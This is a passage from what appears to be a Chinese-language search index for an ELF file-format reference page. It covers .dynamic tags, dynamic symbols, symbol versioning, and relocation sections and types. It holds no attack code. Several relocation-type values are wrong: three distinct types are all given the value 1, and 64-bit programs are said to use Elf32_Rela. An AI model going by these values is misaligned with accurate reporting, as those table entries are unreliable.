\u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u4e00\u4e2a\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u4e32\u8868\u504f\u79fb\uff0c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u662f\u67d0\u4e2a\u5171\u4eab\u76ee\u6807\u7684\u540d\u79f0\u3002\u8be5\u504f\u79fb\u5b9e\u9645\u4e0a\u662f DT_STRTAB \u4e2d\u7684\u7d22\u5f15\u3002 DT_RPATH 15 d_val \u53ef\u9009 \u5ffd\u7565 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u4ee5 NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u4e32\u8868\u504f\u79fb\uff0c\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u662f\u641c\u7d22\u5e93\u65f6\u4f7f\u7528\u7684\u641c\u7d22\u8def\u5f84\u3002\u8be5\u504f\u79fb\u5b9e\u9645\u4e0a\u662f DT_STRTAB \u4e2d\u7684\u7d22\u5f15\u3002 DT_SYMBOLIC 16 \u5ffd\u7565 \u5ffd\u7565 \u53ef\u9009 \u5982\u679c\u8fd9\u79cd\u7c7b\u578b\u8868\u9879\u51fa\u73b0\u5728\u5171\u4eab\u76ee\u6807\u5e93\u4e2d\uff0c\u90a3\u4e48\u8fd9\u5c06\u4f1a\u6539\u53d8\u52a8\u6001\u94fe\u63a5\u5668\u7684\u7b26\u53f7\u89e3\u6790\u7b97\u6cd5\u3002\u52a8\u6001\u8fde\u63a5\u5668\u5c06\u9996\u5148\u9009\u62e9\u4ece\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u672c\u8eab\u5f00\u59cb\u641c\u7d22\u7b26\u53f7\uff0c\u53ea\u6709\u5728\u641c\u7d22\u5931\u8d25\u65f6\uff0c\u624d\u4f1a\u9009\u62e9\u4ece\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u641c\u7d22\u76f8\u5e94\u7684\u7b26\u53f7\u3002 DT_REL 17 d_ptr \u5fc5\u9700 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u4e0e DT_RELA\u7c7b\u578b\u7684\u8868\u9879\u7c7b\u4f3c\uff0c\u53ea\u662f\u5176\u8868\u683c\u4e2d\u5305\u542b\u9690\u5f0f\u7684\u8865\u9f50\uff0c\u5bf9 32 \u4f4d\u6587\u4ef6\u800c\u8a00\uff0c\u5c31\u662f Elf32_Rel\u3002\u5982\u679cELF\u6587\u4ef6\u4e2d\u5305\u542b\u6b64\u5143\u7d20\uff0c\u90a3\u4e48\u52a8\u6001\u7ed3\u6784\u4e2d\u4e5f\u5fc5\u987b\u5305\u542b DT_RELSZ \u548c DT_RELENT \u7c7b\u578b\u7684\u5143\u7d20\u3002 DT_RELSZ 18 d_val \u5fc5\u9700 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_REL \u91cd\u5b9a\u4f4d\u8868\u7684\u603b\u5b57\u8282\u5927\u5c0f\u3002 DT_RELENT 19 d_val \u5fc5\u9700 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_REL \u91cd\u5b9a\u4f4d\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002 DT_PLTREL 20 d_val \u53ef\u9009 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u8fc7\u7a0b\u94fe\u63a5\u8868\u6240\u5f15\u7528\u7684\u91cd\u5b9a\u4f4d\u9879\u7684\u5730\u5740\u3002\u6839\u636e\u5177\u4f53\u60c5\u51b5\uff0c d_val \u5bf9\u5e94\u7684\u5730\u5740\u53ef\u80fd\u5305\u542b DT_REL \u6216\u8005 DT_RELA\u3002\u8fc7\u7a0b\u94fe\u63a5\u8868\u4e2d\u7684\u6240\u6709\u91cd\u5b9a\u4f4d\u90fd\u5fc5\u987b\u91c7\u7528\u76f8\u540c\u7684\u91cd\u5b9a\u4f4d\u65b9\u5f0f\u3002 DT_DEBUG 21 d_ptr \u53ef\u9009 \u5ffd\u7565 \u6b64\u7c7b\u578b\u8868\u9879\u7528\u4e8e\u8c03\u8bd5\u3002ABI \u672a\u89c4\u5b9a\u5176\u5185\u5bb9\uff0c\u8bbf\u95ee\u8fd9\u4e9b\u6761\u76ee\u7684\u7a0b\u5e8f\u53ef\u80fd\u4e0e ABI \u4e0d\u517c\u5bb9\u3002 DT_TEXTREL 22 \u5ffd\u7565 \u53ef\u9009 \u53ef\u9009 \u5982\u679c\u6587\u4ef6\u4e2d\u4e0d\u5305\u542b\u6b64\u7c7b\u578b\u7684\u8868\u9879\uff0c\u5219\u8868\u793a\u6ca1\u6709\u4efb\u4f55\u91cd\u5b9a\u4f4d\u8868\u9879\u80fd\u591f\u9020\u6210\u5bf9\u4e0d\u53ef\u5199\u6bb5\u7684\u4fee\u6539\u3002\u5982\u679c\u5b58\u5728\u7684\u8bdd\uff0c\u5219\u53ef\u80fd\u5b58\u5728\u82e5\u5e72\u91cd\u5b9a\u4f4d\u9879\u8bf7\u6c42\u5bf9\u4e0d\u53ef\u5199\u6bb5\u8fdb\u884c\u4fee\u6539\uff0c\u56e0\u6b64\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u505a\u76f8\u5e94\u7684\u51c6\u5907\u3002 DT_JMPREL 23 d_ptr \u53ef\u9009 \u53ef\u9009 \u8be5\u7c7b\u578b\u7684\u6761\u76ee\u7684 d_ptr \u6210\u5458\u5305\u542b\u4e86\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u5730\u5740\uff0c\u5e76\u4e14\u7d22\u5f15\u65f6\u5e94\u8be5\u4f1a\u628a\u8be5\u5730\u5740\u5f3a\u5236\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7c7b\u578b\u7684\u6307\u9488\u3002\u628a\u91cd\u5b9a\u4f4d\u8868\u9879\u5206\u5f00\u6709\u5229\u4e8e\u8ba9\u52a8\u6001\u94fe\u63a5\u5668\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u65f6\u5ffd\u7565\u5b83\u4eec\uff08\u5f00\u542f\u4e86\u5ef6\u8fdf\u7ed1\u5b9a\uff09\u3002\u5982\u679c\u5b58\u5728\u6b64\u6210\u5458\uff0c\u76f8\u5173\u7684 DT_PLTRELSZ \u548c DT_PLTREL \u5fc5\u987b\u4e5f\u5b58\u5728\u3002 DT_BIND_NOW 24 \u5ffd\u7565 \u53ef\u9009 \u53ef\u9009 \u5982\u679c\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u5b58\u5728\u6b64\u7c7b\u578b\u7684\u8868\u9879\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5c06\u63a7\u5236\u6743\u8f6c\u4ea4\u7ed9\u7a0b\u5e8f\u524d\uff0c\u5e94\u8be5\u5c06\u8be5\u6587\u4ef6\u7684\u6240\u6709\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u5730\u5740\u90fd\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002\u8fd9\u4e2a\u8868\u9879\u7684\u4f18\u5148\u6743\u9ad8\u4e8e\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u53ef\u4ee5\u901a\u8fc7\u73af\u5883\u53d8\u91cf\u6216\u8005dlopen(BA_LIB)\u6765\u8bbe\u7f6e\u3002 DT_LOPROC ~DT_HIPROC 0x70000000 ~0x7fffffff \u672a\u6307\u5b9a \u672a\u6307\u5b9a \u672a\u6307\u5b9a \u8fd9\u4e2a\u8303\u56f4\u7684\u8868\u9879\u662f\u4fdd\u7559\u7ed9\u5904\u7406\u5668\u7279\u5b9a\u7684\u8bed\u4e49\u7684\u3002 \u6ca1\u6709\u51fa\u73b0\u5728\u6b64\u8868\u4e2d\u7684\u6807\u8bb0\u503c\u662f\u4fdd\u7559\u7684\u3002\u6b64\u5916\uff0c\u9664\u4e86\u6570\u7ec4\u672b\u5c3e\u7684 DT_NULL \u5143\u7d20\u4ee5\u53ca DT_NEEDED \u5143\u7d20\u7684\u76f8\u5bf9\u987a\u5e8f\u7ea6\u675f\u4ee5\u5916\uff0c \u5176\u4ed6\u8868\u9879\u53ef\u4ee5\u4ee5\u4efb\u610f\u987a\u5e8f\u51fa\u73b0\u3002","title":".dynamic"},{"location":"executable/elf/elf_structure/#dynstr","text":"","title":".dynstr"},{"location":"executable/elf/elf_structure/#dynsym","text":"","title":".dynsym"},{"location":"executable/elf/elf_structure/#_16","text":"\u52a8\u6001\u94fe\u63a5\u7684 ELF \u6587\u4ef6\u5177\u6709\u4e13\u95e8\u7684\u52a8\u6001\u7b26\u53f7\u8868\uff0c\u5176\u4f7f\u7528\u7684\u7ed3\u6784\u5c31\u662f Elf32_Sym\uff0c\u4f46\u662f\u5176\u5b58\u50a8\u7684\u8282\u4e3a .dynsym\u3002\u8fd9\u91cc\u518d\u6b21\u7ed9\u51fa Elf32_Sym \u7684\u7ed3\u6784 typedef struct { Elf32_Word st_name; /* Symbol name (string tbl index) */ Elf32_Addr st_value; /* Symbol value */ Elf32_Word st_size; /* Symbol size */ unsigned char st_info; /* Symbol type and binding */ unsigned char st_other; /* Symbol visibility under glibc>=2.2 */ Elf32_Section st_shndx; /* Section index */ } Elf32_Sym; \u9700\u8981\u6ce8\u610f\u7684\u662f .dynsym \u662f\u8fd0\u884c\u65f6\u6240\u9700\u7684\uff0cELF \u6587\u4ef6\u4e2d export/import \u7684\u7b26\u53f7\u4fe1\u606f\u5168\u5728\u8fd9\u91cc\u3002\u4f46\u662f\uff0c .symtab \u8282\u4e2d\u5b58\u50a8\u7684\u4fe1\u606f\u662f\u7f16\u8bd1\u65f6\u7684\u7b26\u53f7\u4fe1\u606f\uff0c\u5b83\u4eec\u5728 strip \u4e4b\u540e\u4f1a\u88ab\u5220\u9664\u6389\u3002 \u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u52a8\u6001\u7b26\u53f7\u4e2d\u7684\u4e24\u4e2a\u6210\u5458 st_name\uff0c \u8be5\u6210\u5458\u4fdd\u5b58\u7740\u52a8\u6001\u7b26\u53f7\u5728 .dynstr \u8868\uff08\u52a8\u6001\u5b57\u7b26\u4e32\u8868\uff09\u4e2d\u7684\u504f\u79fb\u3002 st_value\uff0c\u5982\u679c\u8fd9\u4e2a\u7b26\u53f7\u88ab\u5bfc\u51fa\uff0c\u8fd9\u4e2a\u7b26\u53f7\u4fdd\u5b58\u7740\u5bf9\u5e94\u7684\u865a\u62df\u5730\u5740\u3002","title":"\u6982\u8ff0"},{"location":"executable/elf/elf_structure/#_17","text":"\u52a8\u6001\u7b26\u53f7\u4e0e\u6307\u5411\u5b83\u7684 Elf_Verdef \u4fdd\u5b58\u5728 .gnu.version \u6bb5\u4e2d\uff0c\u5176\u4e2d\uff0c\u7531 Elf_Verneed \u7ed3\u6784\u4f53\u6784\u6210\u7684\u6570\u7ec4\u7684\u6bcf\u4e2a\u5143\u7d20\u5bf9\u5e94\u52a8\u6001\u7b26\u53f7\u8868\u7684\u4e00\u9879\u3002\u5176\u5b9e\uff0c\u8fd9\u4e2a\u7ed3\u6784\u4f53\u5c31\u53ea\u6709\u4e00\u4e2a\u57df\uff1a\u90a3\u5c31\u662f\u4e00\u4e2a16\u4f4d\u7684\u6574\u6570\uff0c\u8868\u793a gnu.verion_r \u6bb5\u4e2d\u7684\u4e0b\u6807\u3002 \u5728\u8fd9\u6837\u7684\u60c5\u51b5\u4e0b\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f7f\u7528 Elf_Rel \u7ed3\u6784\u4f53\u6210\u5458 r_info \u4e2d\u7684\u4e0b\u6807\u540c\u65f6\u4f5c\u4e3a .dynsym \u6bb5\u548c gnu.version \u6bb5\u7684\u4e0b\u6807\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e00\u4e00\u5bf9\u5e94\u5230\u6bcf\u4e00\u4e2a\u7b26\u53f7\u5230\u5e95\u662f\u90a3\u4e2a\u7248\u672c\u7684\u4e86\u3002","title":"\u7b26\u53f7\u7248\u672c"},{"location":"executable/elf/elf_structure/#relocation-related-sections","text":"\u94fe\u63a5\u5668\u5728\u5904\u7406\u76ee\u6807\u6587\u4ef6\u65f6\uff0c\u9700\u8981\u5bf9\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u67d0\u4e9b\u4f4d\u7f6e\u8fdb\u884c\u91cd\u5b9a\u4f4d\uff0c\u5373\u5c06\u7b26\u53f7\u6307\u5411\u6070\u5f53\u7684\u4f4d\u7f6e\uff0c\u786e\u4fdd\u7a0b\u5e8f\u6b63\u5e38\u6267\u884c\u3002\u4f8b\u5982\uff0c\u5f53\u7a0b\u5e8f\u8c03\u7528\u4e86\u4e00\u4e2a\u51fd\u6570\u65f6\uff0c\u76f8\u5173\u7684\u8c03\u7528\u6307\u4ee4\u5fc5\u987b\u628a\u63a7\u5236\u6d41\u4ea4\u7ed9\u9002\u5f53\u7684\u76ee\u6807\u6267\u884c\u5730\u5740\u3002 \u5728 ELF \u6587\u4ef6\u4e2d\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u9700\u8981\u91cd\u5b9a\u4f4d\u7684 ELF \u8282\u90fd\u6709\u5bf9\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\uff0c\u6bd4\u5982\u8bf4 .text \u8282\u5982\u679c\u9700\u8981\u91cd\u5b9a\u4f4d\uff0c\u90a3\u4e48\u5176\u5bf9\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\u4e3a .rel.text\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5f53\u4e00\u4e2a\u7a0b\u5e8f\u5bfc\u5165\u67d0\u4e2a\u51fd\u6570\u65f6\uff0c.dynstr \u5c31\u4f1a\u5305\u542b\u5bf9\u5e94\u51fd\u6570\u540d\u79f0\u7684\u5b57\u7b26\u4e32\uff0c.dynsym \u4e2d\u5c31\u4f1a\u5305\u542b\u4e00\u4e2a\u5177\u6709\u76f8\u5e94\u540d\u79f0\u7684\u52a8\u6001\u5b57\u7b26\u4e32\u8868\u7684\u7b26\u53f7\uff08Elf_Sym\uff09\uff0c\u5728 rel.dyn \u4e2d\u5c31\u4f1a\u5305\u542b\u4e00\u4e2a\u6307\u5411\u8fd9\u4e2a\u7b26\u53f7\u7684\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002","title":"Relocation Related Sections"},{"location":"executable/elf/elf_structure/#reladyn-relaplt","text":".rel.dyn \u5305\u542b\u4e86\u52a8\u6001\u94fe\u63a5\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u53d8\u91cf\u7684\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u5728\u52a0\u8f7d\u7684\u65f6\u5019\u5fc5\u987b\u5b8c\u5168\u786e\u5b9a\u3002\u800c .rel.plt \u5305\u542b\u4e86\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u51fd\u6570\u7684\u4fe1\u606f\u3002\u8fd9\u4e24\u7c7b\u91cd\u5b9a\u4f4d\u8282\u90fd\u4f7f\u7528\u5982\u4e0b\u7684\u7ed3\u6784 typedef struct { Elf32_Addr r_offset; Elf32_Word r_info; } Elf32_Rel; typedef struct { Elf32_Addr r_offset; Elf32_Word r_info; Elf32_Sword r_addend; } Elf32_Rela; Elf32_Rela \u7c7b\u578b\u7684\u8868\u9879\u5305\u542b\u660e\u786e\u7684\u8865\u9f50\u4fe1\u606f\u3002 Elf32_Rel \u7c7b\u578b\u7684\u8868\u9879\u5728\u5c06\u88ab\u4fee\u6539\u7684\u4f4d\u7f6e\u4fdd\u5b58\u9690\u5f0f\u7684\u8865\u9f50\u4fe1\u606f\u3002\u7531\u4e8e\u5904\u7406\u5668\u4f53\u7cfb\u7ed3\u6784\u7684\u539f\u56e0\uff0c\u8fd9\u4e24\u79cd\u5f62\u5f0f\u90fd\u5b58\u5728\uff0c\u751a\u81f3\u662f\u5fc5\u9700\u7684\u3002\u56e0\u6b64\uff0c\u5bf9\u7279\u5b9a\u673a\u5668\u7684\u5b9e\u73b0\u53ef\u4ee5\u4ec5\u4f7f\u7528\u4e00\u79cd\u5f62\u5f0f\uff0c\u4e5f\u53ef\u4ee5\u6839\u636e\u4e0a\u4e0b\u6587\u4f7f\u7528\u4e24\u79cd\u5f62\u5f0f\u3002 \u4e00\u822c\u6765\u8bf4\uff0c32 \u4f4d\u7a0b\u5e8f\u53ea\u4f7f\u7528 Elf32_Rel\uff0c64 \u4f4d\u7a0b\u5e8f\u53ea\u4f7f\u7528 Elf32_Rela\u3002 \u5176\u4e2d\uff0c\u6bcf\u4e2a\u5b57\u6bb5\u7684\u8bf4\u660e\u5982\u4e0b \u6210\u5458 \u8bf4\u660e r_offset \u6b64\u6210\u5458\u7ed9\u51fa\u4e86\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u4f4d\u7f6e\u3002 \u5bf9\u4e8e\u4e00\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u800c\u8a00\uff0c\u6b64\u503c\u662f\u4ece\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u7b26\u53f7\u6240\u5728\u8282\u533a\u5934\u90e8\u5f00\u59cb\u5230\u5c06\u88ab\u91cd\u5b9a\u4f4d\u7684\u4f4d\u7f6e\u4e4b\u95f4\u7684\u5b57\u8282\u504f\u79fb\u3002\u5bf9\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u800c\u8a00\uff0c\u5176\u53d6\u503c\u662f\u9700\u8981\u91cd\u5b9a\u4f4d\u7684 \u865a\u62df\u5730\u5740 \uff0c\u4e00\u822c\u800c\u8a00\uff0c\u4e5f\u5c31\u662f\u8bf4\u6211\u4eec\u6240\u8bf4\u7684 GOT \u8868\u7684\u5730\u5740\u3002 r_info \u6b64\u6210\u5458\u7ed9\u51fa\u9700\u8981\u91cd\u5b9a\u4f4d\u7684\u7b26\u53f7\u7684\u7b26\u53f7\u8868\u7d22\u5f15\uff0c\u4ee5\u53ca\u76f8\u5e94\u7684\u91cd\u5b9a\u4f4d\u7c7b\u578b\u3002 \u4f8b\u5982\u4e00\u4e2a\u8c03\u7528\u6307\u4ee4\u7684\u91cd\u5b9a\u4f4d\u9879\u5c06\u5305\u542b\u88ab\u8c03\u7528\u51fd\u6570\u7684\u7b26\u53f7\u8868\u7d22\u5f15\u3002\u5982\u679c\u7d22\u5f15\u662f STN_UNDEF\uff0c\u90a3\u4e48\u91cd\u5b9a\u4f4d\u4f7f\u7528 0 \u4f5c\u4e3a\u201c\u7b26\u53f7\u503c\u201d\u3002\u6b64\u5916\uff0c\u91cd\u5b9a\u4f4d\u7c7b\u578b\u662f\u548c\u5904\u7406\u5668\u76f8\u5173\u7684\u3002 r_addend \u6b64\u6210\u5458\u7ed9\u51fa\u4e00\u4e2a\u5e38\u91cf\u8865\u9f50\uff0c\u7528\u6765\u8ba1\u7b97\u5c06\u88ab\u586b\u5145\u5230\u53ef\u91cd\u5b9a\u4f4d\u5b57\u6bb5\u7684\u6570\u503c\u3002 \u5f53\u7a0b\u5e8f\u4ee3\u7801\u5f15\u7528\u4e00\u4e2a\u91cd\u5b9a\u4f4d\u9879\u7684\u91cd\u5b9a\u4f4d\u7c7b\u578b\u6216\u8005\u7b26\u53f7\u8868\u7d22\u5f15\u65f6\uff0c\u8fd9\u4e2a\u7d22\u5f15\u662f\u5bf9\u8868\u9879\u7684 r_info \u6210\u5458\u5e94\u7528 ELF32_R_TYPE \u6216\u8005 ELF32_R_SYM \u7684\u7ed3\u679c\u3002 \u4e5f\u5c31\u662f\u8bf4 r_info \u7684\u9ad8\u4e09\u4e2a\u5b57\u8282\u5bf9\u5e94\u7684\u503c\u8868\u793a\u8fd9\u4e2a\u52a8\u6001\u7b26\u53f7\u5728.dynsym\u7b26\u53f7\u8868\u4e2d\u7684\u4f4d\u7f6e\u3002 #define ELF32_R_SYM(i) ((i)>>8) #define ELF32_R_TYPE(i) ((unsigned char)(i)) #define ELF32_R_INFO(s,t) (((s)<<8)+(unsigned char)(t)) \u91cd\u5b9a\u4f4d\u8282\u533a\u4f1a\u5f15\u7528\u4e24\u4e2a\u5176\u5b83\u8282\u533a\uff1a \u7b26\u53f7\u8868\u3001\u8981\u4fee\u6539\u7684\u8282\u533a \u3002\u8282\u533a\u5934\u90e8\u7684 sh_info \u548c sh_link \u6210\u5458\u7ed9\u51fa\u76f8\u5e94\u7684\u5173\u7cfb\u3002","title":".rel(a).dyn &amp; .rel(a).plt"},{"location":"executable/elf/elf_structure/#_18","text":"\u91cd\u5b9a\u4f4d\u8868\u9879\u63cf\u8ff0\u4e86\u5982\u4f55\u4fee\u6539\u76f8\u5173\u7684\u6307\u4ee4\u4e0e\u6570\u636e\u57df\uff0c\u5176\u5bf9\u5e94\u7684\u6bd4\u7279\u4f4d\u5982\u4e0b \u5176\u4e2d\uff0cword32 \u6307\u5b9a\u4e86\u4e00\u4e2a 32 \u6bd4\u7279\u7684\u53d8\u91cf\uff0c\u5360\u7528 4 \u4e2a\u5b57\u8282\uff0c\u5bf9\u9f50\u65b9\u5f0f\u4efb\u610f\u3002\u8fd9\u4e9b\u503c\u4f7f\u7528\u548c Intel \u67b6\u6784\u4e2d\u5176\u5b83\u5b57\u7c7b\u4f3c\u7684\u5b57\u8282\u5e8f\uff0c\u4e00\u822c\u90fd\u662f\u5c0f\u7aef\u5e8f\u3002 \u5728\u4e0b\u9762\u7684\u8ba1\u7b97\u4e2d\uff0c\u6211\u4eec\u5047\u8bbe\u662f\u628a\u4e00\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u8f6c\u6362\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002\u4ece\u6982\u5ff5\u4e0a\u8bb2\uff0c\u94fe\u63a5\u5668\u4f1a\u628a\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u5408\u5e76\u8d77\u6765\u5f97\u5230\u8f93\u51fa\u6587\u4ef6\u3002\u5b83\u9996\u5148\u8981\u51b3\u5b9a\u5982\u4f55\u7ed3\u5408\u5e76\u653e\u7f6e\u8fd9\u4e9b\u8f93\u5165\u6587\u4ef6\uff0c\u7136\u540e\u66f4\u65b0\u7b26\u53f7\u8868\u7684\u503c\uff0c\u6700\u540e\u624d\u8fdb\u884c\u91cd\u5b9a\u4f4d\u3002\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u91cd\u5b9a\u4f4d\u65b9\u6cd5\u662f\u76f8\u4f3c\u7684\uff0c\u5e76\u4e14\u7ed3\u679c\u51e0\u4e4e\u4e00\u6837\u3002\u5728\u540e\u9762\u7684\u63cf\u8ff0\u4e2d\u6211\u4eec\u5c06\u4f1a\u91c7\u7528\u5982\u4e0b\u8bb0\u53f7\u3002 A(addend) \u7528\u6765\u8ba1\u7b97\u53ef\u91cd\u5b9a\u4f4d\u5b57\u6bb5\u7684\u53d6\u503c\u7684\u8865\u9f50\u3002 B(base) \u8868\u793a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u7684\u57fa\u5730\u5740\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u865a\u62df\u57fa\u5730\u5740\u4e3a0\uff0c\u4f46\u662f\u5728\u6267\u884c\u65f6\uff0c\u5176\u5730\u5740\u5374\u4f1a\u53d1\u751f\u6539\u53d8\u3002 G(Global) \u8868\u793a\u5728\u6267\u884c\u65f6\u91cd\u5b9a\u4f4d\u9879\u7684\u7b26\u53f7\u5728\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u7684\u504f\u79fb\u3002 GOT (global offset table) \u8868\u793a\u5168\u5c40\u504f\u79fb\u8868\uff08GOT\uff09\u7684\u5730\u5740\u3002 L (linkage) \u8868\u793a\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u4e2d\u4e00\u4e2a\u7b26\u53f7\u7684\u8282\u533a\u504f\u79fb\u6216\u8005\u5730\u5740\u3002\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u4f1a\u628a\u51fd\u6570\u8c03\u7528\u91cd\u5b9a\u4f4d\u5230\u6b63\u786e\u7684\u76ee\u6807\u4f4d\u7f6e\u3002\u94fe\u63a5\u7f16\u8f91\u5668\u4f1a\u6784\u9020\u521d\u59cb\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\uff0c\u7136\u540e\u52a8\u6001\u94fe\u63a5\u5668\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\u4f1a\u4fee\u6539\u8fd9\u4e9b\u9879\u76ee\u3002 P (place) \u8868\u793a\u88ab\u91cd\u5b9a\u4f4d\uff08\u7528 r_offset \u8ba1\u7b97\uff09\u7684\u5b58\u50a8\u5355\u5143\u7684\u4f4d\u7f6e\uff08\u8282\u533a\u504f\u79fb\u6216\u8005\u5730\u5740\uff09\u3002 S (symbol) \u8868\u793a\u7d22\u5f15\u4f4d\u4e8e\u91cd\u5b9a\u4f4d\u9879\u4e2d\u7684\u7b26\u53f7\u7684\u53d6\u503c\u3002 \u91cd\u5b9a\u4f4d\u9879\u7684 r_offset \u53d6\u503c\u4e3a\u53d7\u5f71\u54cd\u7684\u5b58\u50a8\u5355\u5143\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u6216\u8005\u865a\u62df\u5730\u5740\u3002\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7ed9\u51fa\u9700\u8981\u4fee\u6539\u7684\u6bd4\u7279\u4f4d\u4ee5\u53ca\u5982\u4f55\u8ba1\u7b97\u5b83\u4eec\u7684\u503c\u3002\u5176\u4e2d\uff0cIntel \u67b6\u6784\u53ea\u4f7f\u7528 ELF32_REL \u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u5c06\u8981\u88ab\u91cd\u5b9a\u4f4d\u7684\u6210\u5458\u4fdd\u7559\u5bf9\u5e94\u7684\u8865\u9f50\u6570\u503c\u3002\u5728\u6240\u6709\u7684\u60c5\u51b5\u4e0b\uff0c\u8865\u9f50\u7684\u6570\u503c\u4e0e\u8ba1\u7b97\u7684\u7ed3\u679c\u4f7f\u7528\u76f8\u540c\u7684\u5b57\u8282\u5e8f\u3002 \u91cd\u5b9a\u4f4d\u7c7b\u578b\u4ee5\u53ca\u90e8\u5206\u542b\u4e49\u5982\u4e0b \u540d\u79f0 \u503c \u57df \u8ba1\u7b97 \u542b\u4e49 R_386_NONE 0 \u65e0 \u65e0 R_386_32 1 word32 S + A R_386_PC32 1 word32 S + A - P R_386_GOT32 1 word32 G + A - P \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u8ba1\u7b97\u4ece\u5168\u5c40\u504f\u79fb\u8868\u57fa\u5740\u5230\u7b26\u53f7\u7684\u5168\u5c40\u504f\u79fb\u8868\u9879\u7684\u8ddd\u79bb\u3002\u53e6\u5916\uff0c\u5b83\u8fd8\u547d\u4ee4\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u3002 R_386_PLT32 1 word32 L + A - P \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u8ba1\u7b97\u7b26\u53f7\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u5730\u5740\u3002\u53e6\u5916\uff0c\u5b83\u8fd8\u547d\u4ee4\u94fe\u63a5\u5668\u521b\u5efa\u4e00\u4e2a\u8fc7\u7a0b\u94fe\u63a5\u8868\u3002 R_386_COPY 5 \u65e0 \u65e0 \u8be5\u91cd\u5b9a\u4f4d\u7c7b\u578b\u7531\u94fe\u63a5\u5668\u4e3a\u52a8\u6001\u94fe\u63a5\u8fc7\u7a0b\u521b\u5efa\u3002\u5b83\u7684\u504f\u79fb\u9879\u6307\u5411\u53ef\u5199\u6bb5\u4e2d\u7684\u4f4d\u7f6e\u3002\u7b26\u53f7\u8868\u89c4\u5b9a\u8fd9\u79cd\u7b26\u53f7\u5e94\u65e2\u5b58\u5728\u4e8e\u5f53\u524d\u76ee\u6807\u6587\u4ef6\u53c8\u8be5\u5b58\u5728\u4e8e\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u3002\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u4e0e\u8be5\u5171\u4eab\u76ee\u6807\u7b26\u53f7\u76f8\u5173\u7684\u6570\u636e\u590d\u5236\u5230\u7531\u4e0a\u8ff0\u504f\u79fb\u91cf\u6307\u5b9a\u7684\u4f4d\u7f6e\u3002 R_386_GLOB_DAT 6 word32 S 